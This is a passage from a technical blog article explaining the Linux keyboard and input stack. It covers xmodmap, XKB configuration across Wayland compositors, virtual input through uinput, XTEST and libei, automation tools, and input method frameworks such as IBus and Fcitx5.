     10     0x0031 (1)  0x0021 (exclam)   0x0031 (1)  0x0021 (exclam)
     11     0x0032 (2)  0x0040 (at) 0x0032 (2)  0x0040 (at)
     12     0x0033 (3)  0x0023 (numbersign)  0x0033 (3)  0x0023 (numbersign)
     13     0x0034 (4)  0x0024 (dollar)   0x0034 (4)  0x0024 (dollar)
     14     0x0035 (5)  0x0025 (percent)  0x0035 (5)  0x0025 (percent)
     15     0x0036 (6)  0x005e (asciicircum) 0x0036 (6)  0x005e (asciicircum)
     16     0x0037 (7)  0x0026 (ampersand)   0x0037 (7)  0x0026 (ampersand)
     17     0x0038 (8)  0x002a (asterisk) 0x0038 (8)  0x002a (asterisk)
&lt;/code&gt;
    &lt;p&gt;And print the modifiers:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xmodmap -pm
xmodmap:  up to 3 keys per modifier, (keycodes in parentheses):

shift       Shift_L (0x32),  Shift_R (0x3e)
lock        Caps_Lock (0x42)
control     Control_L (0x25),  Control_R (0x69)
mod1        Alt_L (0x40),  Alt_L (0xcc),  Meta_L (0xcd)
mod2        Num_Lock (0x4d)
mod3        ISO_Level5_Shift (0xcb)
mod4        Super_L (0x85),  Super_R (0x86),  Super_L (0xce)
mod5        ISO_Level3_Shift (0x5c)
&lt;/code&gt;
    &lt;p&gt;Or print the keymap as âexpressionsâ:&lt;/p&gt;
    &lt;p&gt;Yes, &lt;code&gt;xmodmap&lt;/code&gt; has its own configuration in &lt;code&gt;~/.Xmodmap&lt;/code&gt; and expression
grammar that looks something like a simplified version of XKB:&lt;/p&gt;
    &lt;code&gt;! remove Caps Lock functionality
remove Lock = Caps_Lock

! make CapsLock (keycode 66) act as Tab
keycode 66 = Tab

! set Menu key (keycode 134) properly
keycode 134 = Menu

! Set Right Alt as Compose (Multi_key)
! Use keysym form so you don't need to know the numeric keycode:
keycode 108 = Multi_key

! ensure Right Alt is not still treated as an Alt modifier
remove Mod1 = Alt_R
&lt;/code&gt;
    &lt;p&gt;Or on-the-fly with:&lt;/p&gt;
    &lt;p&gt;Thereâs even the &lt;code&gt;xkeycaps&lt;/code&gt; GUI around it, and wrappers like
&lt;code&gt;xcape&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Yet, GNOME and certain other toolkits and desktop environments have stopped relying on the old core keymap a long time ago, deprecating it in favor of the XKB related functions. Still, the X server will internally reflect these changes in its XKB cache, making them internally compatible, notifying X clients of teh change, and itâll work but temporarily (mainly with &lt;code&gt;XChangeKeyboardMapping&lt;/code&gt; which calls
&lt;code&gt;XkbApplyMappingChange&lt;/code&gt;
in the X Server). Itâs fragile and legacy. Also, changing the keymap with
&lt;code&gt;xmodmap&lt;/code&gt; is flimsy since any time the XKB keymap is reloading the changes
to the old in-memory X keymap compatibility is lost. Those combined
together means that it isnât reliable to use the old X11 core keymap.&lt;/p&gt;
    &lt;p&gt;As you can see yet again, this is quite confusing and redundant, and obviously Wayland doesnât have these old layers of indirection and relies on XKB directly. It also doesnât need a compiled forms like XKM to upload keymaps to the server, but it doesnât even include that upload part in the protocol anyhow. The keycode to keysym translation is also done in the client (with calls such as &lt;code&gt;xkb_state_key_get_one_sym&lt;/code&gt;)
but the keymap is directly shared along the &lt;code&gt;wl_keyboard&lt;/code&gt; object that
it gets accessed to when it wants input access on the seat, so thereâs
no need for another round-trip.&lt;/p&gt;
    &lt;p&gt;Yet, again the configuration of XKB-related stuff on Wayland depends on the compositor implementation.&lt;/p&gt;
    &lt;p&gt;For example wlroots relies on environment variables to set the RMLVO.&lt;lb/&gt; GNOME on &lt;code&gt;gsettings&lt;/code&gt; with&lt;/p&gt;
    &lt;code&gt;gsettings set org.gnome.desktop.input-sources sources "[('xkb', 'us'), ('xkb', 'fr')]"
&lt;/code&gt;
    &lt;p&gt;Hyprland has&lt;/p&gt;
    &lt;code&gt;hyprctl keyword input:kb_layout "us,fr"
&lt;/code&gt;
    &lt;p&gt;And etcâ¦&lt;/p&gt;
    &lt;p&gt;Letâs go back to the &lt;code&gt;wev&lt;/code&gt; tool,
which displays input events on Wayland, itâll help us understand a
huge difference in input handling on Wayland compared to X11. Unlike X
severs, a Wayland compositor doesnât propagate and broadcast the events
globally to anyone listening. Instead, clients must explicitly register
a listener for the objects they care about. These are announced via the
global Wayland registry, which it has to register to (&lt;code&gt;wl_registry&lt;/code&gt;).&lt;lb/&gt; Afterward, a client has to bind and listen to the given seat (&lt;code&gt;wl_seat&lt;/code&gt;)
of the given name by the registry (this is where the &lt;code&gt;ENV{ID_SEAT}&lt;/code&gt; and
&lt;code&gt;loginctl&lt;/code&gt; can help since they often map 1-to-1), and advertise the set of
âseat capabilitiesâ it requires and wants to bind to, such as pointer,
keyboard, or touch. Once bound, the client can now fetch a handle to the
&lt;code&gt;wl_&amp;lt;pointer/keyboard/touch&amp;gt;&lt;/code&gt; objects, and register listener handlers
for their events. Letâs note that a &lt;code&gt;wl_keyboard&lt;/code&gt; is an abstraction
of all logical keyboard events. So clients arenât aware of underlying
devices, itâs abstracted and aggregated in the compositor internally,
by its own logic. Plus, for extra security, &lt;code&gt;wl_&amp;lt;pointer/keyboard/touch&amp;gt;&lt;/code&gt;
events are only forwarded to the currently focused client. All and all,
itâs very choreographed, unlike in X11.&lt;/p&gt;
    &lt;p&gt;Beyond the core protocol, there are more âunstableâ or ânon-standardâ extensions that allow clients to do more things related to input. Hereâs a non-exhaustive list:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Repositioning the pointer (&lt;code&gt;wp_pointer_warp_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Subscribing to high-def keyboard timestamps (&lt;code&gt;zwp_input_timestamps_manager_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Ignoring keyboard shortcuts from a client (&lt;code&gt;zwp_keyboard_shortcuts_inhibit_manager_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Adding constraints to pointer motion (&lt;code&gt;zwp_pointer_constraints_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Register to handle gestures, swipe, pinch, and hold (&lt;code&gt;zwp_pointer_gestures_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Specific XWayland grabbing of input, monopolizing it (&lt;code&gt;zwp_xwayland_keyboard_grab_manager_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Grab hotkeys, usually not needed since the compositor do this (&lt;code&gt;hyprland_global_shortcuts_manager_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Grab/Inhibit an input to a single surface such as lock screen (&lt;code&gt;zwlr_input_inhibit_manager_v1&lt;/code&gt;,&lt;code&gt;hyprland_focus_grab_manager_v1&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Create virtual pointer/keyboard, fake input (&lt;code&gt;zwlr_virtual_pointer_manager_v1&lt;/code&gt;,&lt;code&gt;org_kde_kwin_fake_input&lt;/code&gt;,&lt;code&gt;zwp_virtual_keyboard_v1&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Notice too that nowhere in the protocol is there any interface to list the compositorâs internal input devices in its registry, itâs intentionally abstracted away. Itâs up to each compositor to choose if it wants to expose this info. To my knowledge, thereâs only Sway that offers an interface for this through swaymsg, itâs kind of similar to &lt;code&gt;gsettings&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;&amp;gt; swaymsg -t get_inputs
&lt;/code&gt;
    &lt;p&gt;The closest compositor-agnostic tools are external utilities such as &lt;code&gt;libinput list-devices&lt;/code&gt; or &lt;code&gt;loginctl seat-status&lt;/code&gt;. However, these
enumerate kernel devices, not the compositorâs internal virtual devices,
so you will not see compositor-created synthetic devices there.&lt;/p&gt;
    &lt;p&gt;In short, which compositor implements which part of the ânon-standardâ protocol varies a lot. GNOME uses almost none of the wlroots/WLR extensions. KDE uses KDE-specific extensions. wlroots-based compositors share WLR extensions. Itâs a mix really, check this for support and more info.&lt;/p&gt;
    &lt;p&gt;We mentioned before &lt;code&gt;localectl&lt;/code&gt; too for setting keyboard keymap
setups that works across environments. Letâs add that when using
the &lt;code&gt;set-x11-keymap&lt;/code&gt; option it will modify X11 configurations in
&lt;code&gt;/etc/X11/xorg.conf.d/00-keyboard.conf&lt;/code&gt; and pre-fill them for you so
you wonât have to worry about editing anything with the options weâve
listed. It doesnât have this option for Wayland though.&lt;/p&gt;
    &lt;code&gt;&amp;gt; localectl [--no-convert] set-x11-keymap layout [model [variant [options]]]
&lt;/code&gt;
    &lt;p&gt;Yet, what if someone on Wayland wants to remap just a specific key without passing by the static XKB and its mess, just a quick runtime change. Thereâs no real solution to that other than what weâve already mentioned in the scancode to keycode section, namely tools that rely on evdev interception to remap events such as &lt;code&gt;evmapd&lt;/code&gt;, &lt;code&gt;evremap&lt;/code&gt;, &lt;code&gt;evdevremapkeys&lt;/code&gt;, &lt;code&gt;evsieve&lt;/code&gt;,
&lt;code&gt;keyd&lt;/code&gt; , &lt;code&gt;kbct&lt;/code&gt;, &lt;code&gt;makima&lt;/code&gt;,
&lt;code&gt;input-remapper&lt;/code&gt;,
etc.. A true panoply of tools that are hacks. Most, if not all, of
these  work by intercepting evdev events, creating a new virtual device
(weâll see how &lt;code&gt;uinput&lt;/code&gt; works in the next section), and modifying the
events on-the-fly to write them to the virtual device. This adds a new
unnecessary layer of indirection, which you should obviously avoid if
you are doing anything speed sensitive with the keyboard. Furthermore,
some of these re-include the key composition and a semblance of XKB
logic within them, which creates a total mess.&lt;lb/&gt; Letâs continueâ¦&lt;/p&gt;
    &lt;p&gt;Contrary to everything else in the GUI stack, XKB composition is a bit less cumbersome. Both Wayland clients, through their toolkits (GTK, Qt, etc..) and X11, through Xlib with the functions weâve seen earlier that do it out-of-the-box (&lt;code&gt;XLookupString&lt;/code&gt;), rely on the
same configuration files weâve discussed in the XKB section. Namely,
&lt;code&gt;/usr/share/X11/locale/&amp;lt;locale&amp;gt;/Compose&lt;/code&gt; and the home &lt;code&gt;~/.XCompose&lt;/code&gt;. It
follows the simple format described in &lt;code&gt;Compose(5)&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;And lastly, one thing that isnât handled neither in libinput nor XKB is key repeat: how long when pressing a key will the client wait to print it again.&lt;/p&gt;
    &lt;p&gt;In X11 this is configured in the X Server, either as a startup option &lt;code&gt;-ardelay&lt;/code&gt; and &lt;code&gt;-arinterval&lt;/code&gt;, or dynamically via &lt;code&gt;xset(1)&lt;/code&gt;. Thereâs the
option to set the delay and interval for a specific key too.&lt;/p&gt;
    &lt;code&gt;&amp;gt; xset r rate delay [rate]
&amp;gt; xset r rate 210 50
&lt;/code&gt;
    &lt;p&gt;If you inspect &lt;code&gt;xev&lt;/code&gt; youâll see that the server resends keys to the
client continuously.&lt;/p&gt;
    &lt;p&gt;Meanwhile, as with everything else on Wayland, it depends on the compositor. The compositor sends to the clients the repeat parameters &lt;code&gt;wl_keyboard.repeat_info(rate, delay)&lt;/code&gt; and itâs up to them to respect
it. So, the compositor doesnât keep forwarding the key to the client but
instead this is handled directly in the client.&lt;lb/&gt; And similarly, these are configured in &lt;code&gt;gsettings&lt;/code&gt; and other
compositor-specific configurations.&lt;/p&gt;
    &lt;p&gt;The repeat key rate and delay being delegated to clients on Wayland has had its share of issues it created though (see) and some people want to have it back in the compositor.&lt;/p&gt;
    &lt;p&gt;Thatâs it, weâve covered most of the things we wanted in the upper graphical stack.&lt;/p&gt;
    &lt;head rend="h1"&gt;Virtual Input, Automation, Emulation, and Remote Desktop&lt;/head&gt;
    &lt;p&gt;Weâve grazed the topic of virtual inputs before, in this section weâll see what types exist and where theyâre used, from automation, emulation, and remote desktop.&lt;/p&gt;
    &lt;p&gt;The first layer where we can create virtual input devices is at the kernel layer. It provides two modules that can be used for this: &lt;code&gt;UHID&lt;/code&gt;, User-space I/O driver support for HID subsystem, and uinput,
the User-space input emulation module.&lt;/p&gt;
    &lt;p&gt;The uhid module, as the name implies, allows simulating HID events from user-space by reading/writing to a special character device in devtmpfs &lt;code&gt;/dev/uhid&lt;/code&gt;. The interface is quite simple as is shown in this
example.
However, this is only used for emulating devices and debugging, not for
the average userâs virtual input. This is the underlying mechanism behind
&lt;code&gt;hid-record&lt;/code&gt; and &lt;code&gt;hid-replay&lt;/code&gt;, which can easily allow debugging hid
issues by reproducing the exact sequences of events on anyoneâs machine.&lt;/p&gt;
    &lt;p&gt;While uhid acts in the HID layer, the uinput module (&lt;code&gt;drivers/input/misc/uinput.c&lt;/code&gt;) acts at the input core layer, which
makes it more approachable for basic input event virtualisation.&lt;lb/&gt; It is also a character device in devtmpfs &lt;code&gt;/dev/uinput&lt;/code&gt; that exposes
particular ioctl to create, manage, and configure capabilities of a
virtual device, and then allow writing to &lt;code&gt;/dev/uinput&lt;/code&gt; file descriptor
to simulate the events of said device. The device will appear, like any
other input device, in devtmpfs and sysfs, since itâll pass by the same
pipeline with &lt;code&gt;struct input_dev&lt;/code&gt; and the default evdev event handler.&lt;/p&gt;
    &lt;p&gt;There are two main ways to use uinput in the code, via &lt;code&gt;&amp;lt;linux/uinput.h&amp;gt;&lt;/code&gt;
or via &lt;code&gt;&amp;lt;libevdev/libevdev-uinput.h&amp;gt;&lt;/code&gt;. The libevdev mechanism is simpler
and recommended.&lt;/p&gt;
    &lt;p&gt;Example 1:&lt;/p&gt;
    &lt;p&gt;Compile with&lt;/p&gt;
    &lt;code&gt;gcc -o uinput_test uinput_test.c -Wall -Wextra
&lt;/code&gt;
    &lt;p&gt;And example 2 with libevdev:&lt;/p&gt;
    &lt;p&gt;Compile with&lt;/p&gt;
    &lt;code&gt;gcc $(pkg-config --cflags --libs libevdev) -o libevdev_example example.c
&lt;/code&gt;
    &lt;p&gt;The disadvantage of uhid and uinput is that, since they interface with the kernel, they require root privilege and relying on HID or evdev might not be practical for the average day-to-day usage. For example, if we want to output a symbol, letâs say âpâ, we have to know its keycode, and for that we need to know the keymapping, which in turn requires XKB or others. Thus, weâre back to square one and re-creating the upper input stack from scratch.&lt;/p&gt;
    &lt;p&gt;What if we could directly say âsend this keycode or keysym, itâs from this virtual deviceâ, without even needing extra permission if weâre already in a desktop environment. Well, thatâs exactly what the X11 XTEST extension does, and what some Wayland extensions and mechanisms achieve too.&lt;/p&gt;
    &lt;p&gt;Remember when we used xinput to list some devices and some virtual ones were listed:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xinput list
Virtual core pointer                          id=2    [master pointer  (3)]
â   â³ Virtual core XTEST pointer                id=4    [slave  pointer  (2)]
â¦
Virtual core keyboard                         id=3    [master keyboard (2)]
    â³ Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]
â¦
&lt;/code&gt;
    &lt;p&gt;These were created by the XTest extension which was written to support automated testing of X server. These days this can be used for remote desktop, task automation, password managers (autofill), and others. When clients interface through this extension they directly inject keyboard and mouse events into the X server, bypassing the whole input stack, and these events are propagated afterward to the X clients.&lt;lb/&gt; Letâs see a simple programming example relying on &lt;code&gt;XTEST(3)&lt;/code&gt; that will
send the keysym âaâ:&lt;/p&gt;
    &lt;p&gt;Compile with:&lt;/p&gt;
    &lt;code&gt;&amp;gt; gcc xtest_min.c -o xtest_min -lX11 -lXtst
&lt;/code&gt;
    &lt;p&gt;Thatâs clean and easy, now on Wayland the picture is a bit more complex since the protocol doesnât allow clients to randomly generate input events. It was designed this way for security reasons.&lt;/p&gt;
    &lt;p&gt;As with anything Wayland, there are a few unstable extensions, though deprecated now, such as &lt;code&gt;zwlr_virtual_pointer_v1&lt;/code&gt; and
&lt;code&gt;zwp_virtual_keyboard_manager_v1&lt;/code&gt;, mostly wlroots Wayland extensions.&lt;/p&gt;
    &lt;p&gt;An example of the &lt;code&gt;zwp_virtual_keyboard_manager_v1&lt;/code&gt; extension would look
somewhat like this:&lt;/p&gt;
    &lt;p&gt;But for a better example check the source of &lt;code&gt;wlrctl&lt;/code&gt;
that also relies on the &lt;code&gt;zwp_virtual_keyboard_manager_v1&lt;/code&gt; extension.&lt;/p&gt;
    &lt;p&gt;Yet, these days, this isnât the path that Wayland has taken, and none of the compositors agree on these extensions, instead they rely on libei, a library to consolidate Emulated Input. This is its architecture:&lt;/p&gt;
    &lt;p&gt;Courtesy from https://libinput.pages.freedesktop.org/libei/&lt;/p&gt;
    &lt;p&gt;It has two pieces: a client side that creates virtual devices and generates evdev events, and the server side called EIS that lives within the compositor (but that isnât limited to Wayland) and is responsible for giving a file descriptor to the client to interface with, and dispatching received events to where they need to go. The dispatching could be through uinput devices, thatâs an implementation detail, yet most compositors just store it as an internal virtual device.&lt;/p&gt;
    &lt;p&gt;This allows compositor to be aware of who is currently emulating input, which capabilities they require (keyboard, touch, pointer), and to restrict and/or suspend devices at any time.&lt;/p&gt;
    &lt;p&gt;Optionally, the compositor may delegate the file descriptor mechanism to a xdg-desktop-portal dbus service implemented by the desktop environment so that it can check with polkit and others the allowed permissions (see). So it would look like this:&lt;/p&gt;
    &lt;code&gt;    +--------------------+
    | Wayland compositor |_
    +--------------------+  \
    | libinput | libeis  |   \_wayland______
    +----------+---------+                  \
        |     [eis-0.socket]                 \
 /dev/input/     /   \\       +-------+------------------+
                |      ======&amp;gt;| libei | Wayland client A |
                |      after    +-------+------------------+
         initial|     handover   /
      connection|               / initial request
                |              /  dbus[org.freedesktop.portal.EmulatedInput]
                |              /  or dbus[org.freedesktop.portal.RemoteDesktop]
        +--------------------+
        | xdg-desktop-portal |
        +--------------------+
&lt;/code&gt;
    &lt;p&gt;An example implementation of a client can be found here. Or mixed with an XKB mess to translate from keysym to keycode, for the pleasure of your eyes:&lt;/p&gt;
    &lt;p&gt;Then obviously the EIS side has to catch these events and handle them. Thereâs also an example that creates uinput devices found here.&lt;/p&gt;
    &lt;p&gt;The main logic of an EIS is quite straight forward (from the official docs):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;create a context with &lt;code&gt;eis_new()&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;set up a backend with &lt;code&gt;eis_setup_backend_fd()&lt;/code&gt;or&lt;code&gt;eis_setup_backend_socket()&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;register the &lt;code&gt;eis_get_fd()&lt;/code&gt;with its own event loop&lt;/item&gt;
      &lt;item&gt;call &lt;code&gt;eis_dispatch()&lt;/code&gt;whenever the fd triggers&lt;/item&gt;
      &lt;item&gt;call &lt;code&gt;eis_get_event()&lt;/code&gt;and process incoming events&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And whenever a new client connects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;accept new clients with &lt;code&gt;eis_client_connect()&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;create one or more seats for the client with &lt;code&gt;eis_client_new_seat()&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;wait for &lt;code&gt;EIS_EVENT_SEAT_BIND&lt;/code&gt;and then&lt;/item&gt;
      &lt;item&gt;create one or more devices with the bound capabilities, see &lt;code&gt;eis_seat_new_device()&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thatâs kind of like network programming.&lt;/p&gt;
    &lt;p&gt;So far, most Wayland compositors implement this mechanism along with portals. You can see the list of support here, from GNOME, KDE, XWayland, and more.&lt;/p&gt;
    &lt;p&gt;On that note, XWayland is both an X server, and a Wayland client. So it understands XTest requests. Yet what happens when it receives them is that internally it relies on libei client side to handle virtual device events. That means xdotool can work on XWayland with libei context.&lt;/p&gt;
    &lt;code&gt;    +--------------------+             +------------------+
    | Wayland compositor |---wayland---| Wayland client B |
    +--------------------+\            +------------------+
    | libinput | libeis  | \_wayland______
    +----------+---------+                \
        |          |           +-------+------------------+
 /dev/input/       +---brei----| libei |     XWayland     |
                               +-------+------------------+
                                                |
                                                | XTEST
                                                |
                                         +-----------+
                                         |  X client |
                                         +-----------+
&lt;/code&gt;
    &lt;p&gt;This is summarized well here, I quote:&lt;/p&gt;
    &lt;quote&gt;
      &lt;item&gt;An X11 client sends a key event using XTEST (normal)&lt;/item&gt;
      &lt;item&gt;XWayland receives it and initiates Remote Desktop XDG Portal session to â¦ your own system (???)&lt;/item&gt;
      &lt;item&gt;XDG Portal uses DBus in an odd way, with many method calls receiving responses via signals because DBus isnât designed for long asynchronous methods.&lt;/item&gt;
      &lt;item&gt;Once the Remote Desktop portal session is setup, Xwayland asks for a file descriptor to talk an libei server (emulated input server).&lt;/item&gt;
      &lt;item&gt;After that, libei is used to send events, query the keyboard map, etc.&lt;/item&gt;
      &lt;item&gt;You can ask libei for the keyboard mapping (keycodes to keysyms, etc), you get another file descriptor and process that with yet another library, libxkbcommon.&lt;/item&gt;
    &lt;/quote&gt;
    &lt;p&gt;The main issue is that if the libei client gets its file descriptor via dbus portal, then every time it asks for it then the user will get prompted to âAllow remote interaction?â. And most portal software donât have config or whitelist rule mechanisms to skip that (as far as I know), which would make sense while keeping the same security level.&lt;/p&gt;
    &lt;p&gt;When it comes to remote desktop on Wayland, itâs quite similar, it relies on the same libei mechanism. Yet, we need to add to the equation, as far as input goes, a listener that captures input regardless of the focused window.&lt;/p&gt;
    &lt;p&gt;The remote desktop is also achieved with libei and a dbus xdg-desktop-portal either &lt;code&gt;org.freedesktop.portal.RemoteDesktop&lt;/code&gt; or
&lt;code&gt;.InputCapture&lt;/code&gt;, which will give back to the client
a special file descriptor for listening to the input stream.&lt;lb/&gt; And similarly, it is always explicit about asking for permission to share input or share the screen (or specific window/surface), and there doesnât seem to be a general configuration to turn it off or whitelist certain clients (see discussion).&lt;/p&gt;
    &lt;p&gt;Letâs note that in the case of Wayland it is the compositor that usually provides VNC/RDP servers, for example KWin and GNOME Mutter (apart from &lt;code&gt;wayvnc&lt;/code&gt; for wlroots compositors).&lt;lb/&gt; Meanwhile, on X11 the remote desktop protocol was part of the X11 protocol itself from the start, with full access, the whole events. The X server can be on another machine and clients can communicate with it over the X11 protocol, or the events could be forwarded over ssh and others. VNC and other remote desktop protocol can rely on how open it is too. Plus, XTEST is there for injecting events too. Thereâs no limitation for apps to read the screen framebuffer either, send it, and draw it in another X session, but itâs often re-rendered when doing remote desktop. (x11vnc, TigerVNC, etc..). There have been extensions over the years for security (XACE) but nobody is relying on them.&lt;lb/&gt; Thereâs also xrdp, but this creates a whole new virtual Xorg session, so itâs another story.&lt;/p&gt;
    &lt;p&gt;Letâs now review a couple of tools used for automation.&lt;/p&gt;
    &lt;p&gt;Weâve already seen quite a lot of the ones that rely on evdev and uinput, but now they will make more sense with our current context:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;evemu&lt;/code&gt;and&lt;code&gt;evtest&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;libinput record&lt;/code&gt;and&lt;code&gt;libinput replay&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;unplug&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;evsieve&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;code&gt;keyd&lt;/code&gt;- creates a uinput device to remap keys&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;evmux&lt;/code&gt;and&lt;code&gt;inputattach&lt;/code&gt;- multiplex multiple evdev devices into a single virtual stream&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The most popular tool that relies on XTEST (plus EWMH and others) is &lt;code&gt;xdotool&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;NB: the âtoplevel-managementâ Wayland âunstableâ extension somewhat replaces some of the EWMH, but itâs not implemented by most compositor for security reasons.&lt;/p&gt;
    &lt;p&gt;Similar tools to &lt;code&gt;xdotool&lt;/code&gt; but that relies on uinput are &lt;code&gt;ydotool&lt;/code&gt; and
&lt;code&gt;dotool&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Weâve seen &lt;code&gt;wlrctl&lt;/code&gt; that relies on the unstable wayland protocol for
wlroots-based compositors. Thereâs also &lt;code&gt;wtype&lt;/code&gt; that also relies on the
unstable virtual keyboard protocol.&lt;/p&gt;
    &lt;p&gt;We can also possibly perform automation via very specific desktop environment mechanisms. That means using something such as GNOME shell extensions for example, which has a javascript API. KDE has that concept and the utility &lt;code&gt;kdotool&lt;/code&gt; relies on this.&lt;/p&gt;
    &lt;p&gt;As youâve observed, the situation is a bit fragmented on Wayland when it comes to automations, both in utilities and extensions.&lt;/p&gt;
    &lt;head rend="h1"&gt;Input Method&lt;/head&gt;
    &lt;p&gt;In this last section weâll explore the concept of input method (IMF &amp;amp; IME), a mechanism to input keysym/characters that are not natively available on the userâs input device. This is necessary for languages that have more graphemes than there are keys on the keyboard.&lt;/p&gt;
    &lt;p&gt;There are two sides to the equation: the IMF, the input method framework, and the IME, the input method engine which works within the framework. An input method frameworkâs role is to pick the most appropriate way to enter the text, shape it, and return it to the widget. The IME is basically the place where input are interpreted in any way shape, form, or logic, to produce the text that the IMF asked for.&lt;lb/&gt; The IMF can also act as wrapper over XKB configs, to allow easily swapping between keyboard layouts, it coexist with the idea of switching between different IMEs.&lt;lb/&gt; Simply said, the IME is a middleman between the keyboard and the actual output text when relying on the toolkit/widget.&lt;/p&gt;
    &lt;p&gt;Courtesy from https://nerufic.com/en/posts/how-input-methods-work-in-linux/&lt;/p&gt;
    &lt;p&gt;Courtesy from https://www.chromium.org/chromium-os/chromiumos-design-docs/text-input/basic-architecture2.png&lt;/p&gt;
    &lt;p&gt;The way the input method plugs into the whole input stack is at the window client side, within the widget/toolkit library framework in the input handling event loop. After the client performs the keycode to keysym translation and composing, it calls the toolkit specifically configured input method, which will reroute it to the IM pipeline. Within the pipeline, the IMF implementation will talk over its protocol to have the IME interpret the input, and return preedit and committed text. This will in turn be pushed back to the toolkit to display.&lt;lb/&gt; That means that simply by relying on input widgets from a framework such as GTK or Qt, it will automatically handle the integration with the Input Method.&lt;/p&gt;
    &lt;p&gt;Some of these input frameworks are swappable, either because they talk over the same protocol, be it the old deprecated XIM protocol for legacy purpose (X Input Method over X protocol extension), or because they plug straight as a module into the widget framework, which is mostly that case today.&lt;/p&gt;
    &lt;p&gt;There are a lot of IMFs and IMEs implementations, and interoperability, see this list. These days the two major IMFs are IBus (Intelligent Input Bus, GTK-based like GNOME), and Fcitx5 (Qt-based like KDE).&lt;/p&gt;
    &lt;p&gt;To swap between them, if they are compatible with the toolkit, one can set certain environment variables related to their toolkit:&lt;/p&gt;
    &lt;code&gt;GTK_IM_MODULE=ibus
QT_IM_MODULE=ibus
XMODIFIERS=@im=ibus
&lt;/code&gt;
    &lt;p&gt;For example the path that the text will take with Ibus looks like this:&lt;/p&gt;
    &lt;code&gt;Application â GTK/Qt IM module â D-Bus â IBus/Fcitx
               â    IME      â D-Bus â GTK/Qt widget
&lt;/code&gt;
    &lt;p&gt;As you can see, this bypasses all graphic servers, be it the X servers or Wayland compositors.&lt;/p&gt;
    &lt;p&gt;Yet for it to work across the Wayland ecosystem, and not only on some widgets like GTK and Qt (games, electron apps, java apps, sandboxed apps, etc..), the IMF/IME stack needs to be able to listen to key events from any application, provided it is focused, get the surrounding context, take field focus, and inject text into clients. This is why some âunstableâ extensions were created, mostly âtext-input-unstable-v3â (&lt;code&gt;zwp_text_input_v3&lt;/code&gt;) and âinput-method-v2â (&lt;code&gt;zwp_input_methd_v2&lt;/code&gt;)
protocol. With this, thereâll be consistent IM behavior across all
applications without compromising security.&lt;/p&gt;
    &lt;p&gt;On a side note, this same extension protocol for injecting text can be used for the speech-to-text accessibility framework. In practice this can either be done via a virtual input device, or a specific desktop service mechanism integrated in the toolkits. We have a desktop service catching voice input, a standalone voice recognizer to convert it to text, and a virtual keyboard or feature to inject events. For example, GNOME VoiceInput, Plasma Whisper Integration, QtSpeech, SpeechDispatcher, Caribou, Onboard, or GNOME Accessibility Services (AT-SPI). We wonât go into details on that, nor mention text-to-speech, since itâs outside our scope.&lt;/p&gt;
    &lt;p&gt;One issue remains though, and itâs related to the key repeat rate and delay, which on Wayland is implemented client-side. Itâs not implemented by IMs, and tough to handle apparently (see).&lt;/p&gt;
    &lt;p&gt;And that it!&lt;/p&gt;
    &lt;head rend="h1"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Congratulations for making it this far into the article!&lt;lb/&gt; Weâve covered a lot of ground, literally from hardware to the very abstract components of the graphical input stack.&lt;/p&gt;
    &lt;p&gt;I have some hope that in the future thereâs going to be a more common way to configure the Wayland input stack across compositors and have fewer discrepancies and fragmentation. I also wish the XKB stack would one day get cleanup up, but on this one my hopes are pretty low. Itâs fallen victim to entropy and chaos.&lt;/p&gt;
    &lt;p&gt;A huge gigantic thanks to âwho-tâ aka Peter Hutterer, whose blog has been my trusty companion for the past months.&lt;/p&gt;
    &lt;p&gt;We need more articles like this in the age of AI overlords, so please share it if youâve enjoyed it!&lt;/p&gt;
    &lt;p&gt;Thanks for reading, have a wonderful end of day!&lt;/p&gt;
    &lt;p&gt;NB: This article compiles my understand, for any correction please contact me.&lt;/p&gt;
    &lt;head rend="h1"&gt;Diagrams Summary&lt;/head&gt;
    &lt;head rend="h1"&gt;Resources&lt;/head&gt;
    &lt;list rend="ul"&gt;
